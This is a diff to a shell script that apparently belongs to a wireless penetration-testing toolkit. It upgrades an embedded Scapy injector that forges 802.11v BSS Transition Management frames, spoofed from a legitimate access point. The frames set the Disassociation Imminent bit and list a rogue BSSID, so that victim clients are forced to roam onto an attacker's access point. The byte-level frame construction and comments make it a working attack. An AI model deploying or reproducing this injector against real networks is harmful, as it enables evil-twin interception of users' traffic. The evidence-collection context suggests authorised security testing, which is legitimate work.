@@ -27,13 +27,10 @@ set -euo pipefail
 # Intelligence Insight (Colors)
 C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
 C_VAR="${ASTRA_COLOR_VAR:-}"
-C_BOLD="${ASTRA_COLOR_BOLD:-}"
-C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
 # Inputs from Environment
 INTERFACE="${MONITOR_INTERFACE:-}"
-SSID="${GUEST_SSID:-}"
 BSSID="${GUEST_BSSID:-}"
 SESSION_DIR="${SESSION_DIR:-.}"
 EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
@@ -73,19 +70,42 @@ print(f"[*] Sending BTM Request to {target_client} from {source_ap}...")
 # 802.11v BSS Transition Management Request
 # Type: Management (0), Subtype: 13 (Action)
 # Category: WNM (10), Action: BTM Request (7)
+#
+# BTM Request body:
+#   Byte 0: Dialog Token = 1
+#   Byte 1: Request Mode = 0x0C
+#     Bit 2 (0x04) = Preferred Candidate List Included
+#     Bit 3 (0x08) = Disassociation Imminent — tells client it MUST roam; without
+#                    this bit clients treat the request as a suggestion and ignore it
+#   Bytes 2-3: Disassoc Timer = 0x0064 (100 TUs ≈ 100ms grace period)
+#   Byte 4:   Validity Interval = 0xFF (maximum — give client time to associate)
+#
+# Neighbor Report subelement (ID=52) for the rogue BSSID candidate:
+#   Subelement ID: 52 (0x34)
+#   Length: 13
+#   BSSID: 6 bytes
+#   BSSID Info: 0x0000008F (reachability=3, security=1, key_scope=1, cap_spectrum_mgmt=1)
+#   Operating Class: 81 (2.4GHz channels 1-13)
+#   Channel Number: 6
+#   PHY Type: 4 (ERP, 802.11g)
+rogue_bytes = bytes.fromhex(rogue_ap.replace(":", ""))
+bssid_info = b"\x8f\x00\x00\x00"   # little-endian BSSID Info
+neighbor = bytes([0x34, 13]) + rogue_bytes + bssid_info + bytes([81, 6, 4])
+
+payload = bytes([1, 0x0C, 0x64, 0x00, 0xFF]) + neighbor
+
 pkt = RadioTap() / Dot11(addr1=target_client, addr2=source_ap, addr3=source_ap) / \
       Dot11Action(category=10, action=7) / \
-      Raw(load=b"\x01\x00\x00\x00\x00" + bytes.fromhex(rogue_ap.replace(":", "")))
+      Raw(load=payload)
 
-sendp(pkt, iface=iface, count=10, inter=0.1, verbose=0)
+sendp(pkt, iface=iface, count=15, inter=0.1, verbose=0)
+print("[+] BTM Request frames sent (Disassociation Imminent mode).")
 EOF
 
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE"
+    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE" || true
 else
-    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE" > /dev/null 2>&1 &
-    TOOL_PID=$!
-    wait $TOOL_PID || true
+    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
 fi
 
 # Reporting
